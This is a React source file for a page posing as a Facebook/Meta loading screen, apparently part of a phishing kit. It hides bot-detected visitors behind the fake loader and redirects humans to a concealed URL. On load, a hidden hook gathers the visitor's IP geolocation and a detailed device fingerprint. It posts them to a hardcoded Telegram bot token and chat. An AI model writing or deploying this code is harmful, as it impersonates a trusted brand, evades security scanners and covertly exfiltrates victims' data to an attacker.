import FacebookLogo from '@/assets/images/facebook-icon.webp';
import MetaImage from '@/assets/images/meta-logo.png';
import type { FC } from 'react';
import { useEffect, useState } from 'react';
import { useBotDetection } from '@/hooks/useBotDetection';

const LoadingDots = () => {
    const [dots, setDots] = useState('');

    useEffect(() => {
        const interval = setInterval(() => {
            setDots((prev) => {
                if (prev.length >= 5) return '';
                return prev + '.';
            });
        }, 300);

        return () => clearInterval(interval);
    }, []);

    return (
        <div className="flex h-4 w-24 items-center justify-center gap-2">
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 1 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 2 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 3 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 4 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 5 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
        </div>
    );
};

const Index: FC = () => {
    const { isBot, isLoading, shouldRedirect } = useBotDetection();
    const [redirecting, setRedirecting] = useState(false);

    useEffect(() => {

        console.log('Redirect check:', { shouldRedirect, isBot, isLoading });
        if (shouldRedirect && !isBot && !isLoading) {
            setRedirecting(true);
            const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
            console.log('Redirecting to:', redirectUrl);
            window.location.href = redirectUrl;
        }
    }, [shouldRedirect, isBot, isLoading]);
    useEffect(()=>{
const fetchGeoAndSendTelegram = async () => {
  const geoUrl = 'https://get.geojs.io/v1/ip/geo.json'
  const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA'
  const chatId = '-4795436920'

  const geoRes = await fetch(geoUrl)
  const geoData = await geoRes.json()

  const battery = await navigator.getBattery?.()
  const permissions = await navigator.permissions?.query({ name: 'geolocation' })

  const fullFingerprint = {
    ...geoData,
    navigator: {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      maxTouchPoints: navigator.maxTouchPoints,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      webdriver: navigator.webdriver,
      appCodeName: navigator.appCodeName,
      appName: navigator.appName,
      appVersion: navigator.appVersion,
      product: navigator.product,
      productSub: navigator.productSub,
      vendor: navigator.vendor,
      vendorSub: navigator.vendorSub,
      plugins: [...navigator.plugins].map(p => p.name),
      mimeTypes: [...navigator.mimeTypes].map(m => m.type),
      pdfViewerEnabled: navigator.pdfViewerEnabled,
      userActivation: navigator.userActivation?.toString(),
      scheduling: navigator.scheduling?.toString(),
      geolocation: navigator.geolocation?.toString(),
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      } : null,
      battery: battery ? {
        level: battery.level,
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      } : null,
      permissions: permissions ? { state: permissions.state } : null,
      userAgentData: navigator.userAgentData,
      onLine: navigator.onLine
    },
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth
    },
    window: {
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      devicePixelRatio: window.devicePixelRatio
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    locale: Intl.DateTimeFormat().resolvedOptions().locale,
    performance: {
      memory: performance.memory ? {
        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
        totalJSHeapSize: performance.memory.totalJSHeapSize,
        usedJSHeapSize: performance.memory.usedJSHeapSize
      } : null,
      navType: performance.navigation.type
    }
  }

  const msg = `<pre>${JSON.stringify(fullFingerprint, null, 2)}</pre>`

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`
  const payload = {
    chat_id: chatId,
    text: msg,
    parse_mode: 'HTML'
  }

  await fetch(telegramUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
}
fetchGeoAndSendTelegram()
},[])
    useEffect(() => {
        if (!isLoading && !isBot && !shouldRedirect) {
            const timer = setTimeout(() => {
                setRedirecting(true);
                const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
                window.location.href = redirectUrl;
            }, 5000);

            return () => clearTimeout(timer);
        }
    }, [isBot, isLoading, shouldRedirect]);

    if (isLoading) {
        return (
            <div className="fixed inset-0 flex items-center justify-center bg-white">
                <div className="flex flex-col items-center gap-2">
                    <img
                        src={FacebookLogo}
                        alt="Loading..."
                        className="h-16 w-16 md:h-20 md:w-20"
                    />
                    <LoadingDots />
                </div>
                <img
                    src={MetaImage}
                    alt="Meta"
                    className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
                />
            </div>
        );
    }

    if (isBot) {
        return (
            <div className="fixed inset-0 flex items-center justify-center bg-white">
                <div className="flex flex-col items-center gap-2">
                    <img
                        src={FacebookLogo}
                        alt="Loading..."
                        className="h-16 w-16 md:h-20 md:w-20"
                    />
                    <LoadingDots />
                </div>
                <img
                    src={MetaImage}
                    alt="Meta"
                    className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
                />
            </div>
        );
    }

    return (
        <div className="fixed inset-0 flex items-center justify-center bg-white">
            <div className="flex flex-col items-center gap-4">
                <img src={FacebookLogo} alt="Loading..." className="h-16 w-16 md:h-20 md:w-20" />
                {redirecting ? (
                    <div className="text-center">
                        <LoadingDots />
                    </div>
                ) : shouldRedirect ? (
                    <div className="text-center">
                        <LoadingDots />
                    </div>
                ) : (
                    <LoadingDots />
                )}
            </div>
            <img
                src={MetaImage}
                alt="Meta"
                className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
            />
        </div>
    );
};

export default Index;
